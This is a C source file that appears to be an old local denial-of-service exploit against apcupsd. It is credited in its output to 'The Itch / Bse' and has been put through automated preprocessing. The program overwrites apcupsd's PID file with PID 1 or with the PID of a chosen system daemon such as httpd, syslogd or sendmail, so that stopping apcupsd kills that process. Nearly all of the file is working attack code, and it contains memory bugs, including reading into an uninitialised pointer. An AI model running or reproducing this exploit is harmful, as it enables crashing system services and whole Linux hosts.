
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 char* CRONDPID ;
 char* HTTPDPID ;
 char* IDENTDPID ;
 char* INETDPID ;
 char* KLOGDPID ;
 char* PIDFILE ;
 char* SENDMAILPID ;
 char* SYSLOGDPID ;
 int atoi (char*) ;
 int dosusage (char*) ;
 int exit (int) ;
 int fclose (int *) ;
 int fgets (char*,int,int *) ;
 int * fopen (char*,char*) ;
 int fprintf (int *,char*) ;
 int printf (char*,...) ;

int main(int argc, char **argv)
{
 FILE *apcpid;
 FILE *dospidfile;
 char *dospid[5];
 int dosarg;

 printf("\nAPCUPSD can be used to crash any linux distribution\n");
 printf("or any other pid running at that moment when apcupsd is\n");
  printf("stopped or when it gets normally killed using its pid.\n");
 printf("\nCoded by The Itch / Bse\n\n");

 if(argc < 2) { dosusage(argv[0]); exit(0); }
 if(atoi(argv[1]) > 8) { dosusage(argv[0]); exit(0); }
 dosarg = atoi(argv[1]);

 apcpid = fopen(PIDFILE, "r");
 if(!apcpid)
 {
  printf("%s does not exist\n\n", PIDFILE);
  exit(1);
 }
 fclose(apcpid);

 apcpid = fopen(PIDFILE, "w");

 if(dosarg == 1)
 {

  fprintf(apcpid, "1");
 }
 if(dosarg == 2)
 {

  dospidfile = fopen(HTTPDPID, "r");
  fgets(dospid[4], 4, dospidfile);
  fclose(dospidfile);
  fprintf(apcpid, dospid[4]);
 }
 if(dosarg == 3)
 {

  dospidfile = fopen(KLOGDPID, "r");
  fgets(dospid[4], 4, dospidfile);
  fclose(dospidfile);
  fprintf(apcpid, dospid[4]);
 }
 if(dosarg == 4)
 {

  dospidfile = fopen(CRONDPID, "r");
  fgets(dospid[4], 4, dospidfile);
  fclose(dospidfile);
  fprintf(apcpid, dospid[4]);
 }
 if(dosarg == 5)
 {

  dospidfile = fopen(SYSLOGDPID, "r");
  fgets(dospid[4], 4, dospidfile);
  fclose(dospidfile);
  fprintf(apcpid, dospid[4]);
 }
 if(dosarg == 6)
 {

  dospidfile = fopen(INETDPID, "r");
  fgets(dospid[4], 4, dospidfile);
  fclose(dospidfile);
  fprintf(apcpid, dospid[4]);
 }
 if(dosarg == 7)
 {

  dospidfile = fopen(IDENTDPID, "r");
  fgets(dospid[4], 4, dospidfile);
  fclose(dospidfile);
  fprintf(apcpid, dospid[4]);
 }
 if(dosarg == 8)
 {

  dospidfile = fopen(SENDMAILPID, "r");
  fgets(dospid[4], 4, dospidfile);
  fclose(dospidfile);
  fprintf(apcpid, dospid[4]);
 }

 fclose(apcpid);
 printf("DoS activated, its now a matter of time until apcupsd gets\n");
 printf("restarted or stopped....\n\n");

 return 0;
}
